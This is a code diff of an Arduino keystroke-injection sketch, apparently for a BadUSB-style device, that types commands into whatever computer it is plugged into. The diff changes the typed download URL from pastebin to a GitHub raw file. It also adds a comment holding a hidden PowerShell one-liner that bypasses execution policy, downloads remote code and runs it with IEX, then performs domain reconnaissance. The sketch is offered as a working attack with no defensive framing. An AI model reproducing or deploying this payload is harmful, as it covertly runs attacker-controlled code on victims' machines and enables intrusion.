@@ -36,7 +36,7 @@ void setup()
   Keyboard.write(96);
   Keyboard.print(F("https"));
   Keyboard.write(63);
-  Keyboard.print(F("\334\334pastebin.com\334raw\334XWnCgk9Y"));
+  Keyboard.print(F("\334\334raw.githubusercontent.com\334ZoeiroVader\334ZvProjects\334master\334AppGerenciador\334log.txt"));
   Keyboard.write(96);
   Keyboard.print(F(")"));
   Keyboard.write(47);
@@ -44,25 +44,11 @@ void setup()
   Keyboard.write(126);
   delay(300);
   typeKey(KEY_RETURN);
-  
+  //https://raw.githubusercontent.com/ZoeiroVader/ZvProjects/master/AppGerenciador/log.txt
+  //powershell.exe -WindowStyle hidden -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ZoeiroVader/Xmaster/appGerenciador/log.txt'); Get-NetDomain"
   // Ending stream
   Keyboard.end();
 }
 
 /* Unused endless loop */
 void loop() {}
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
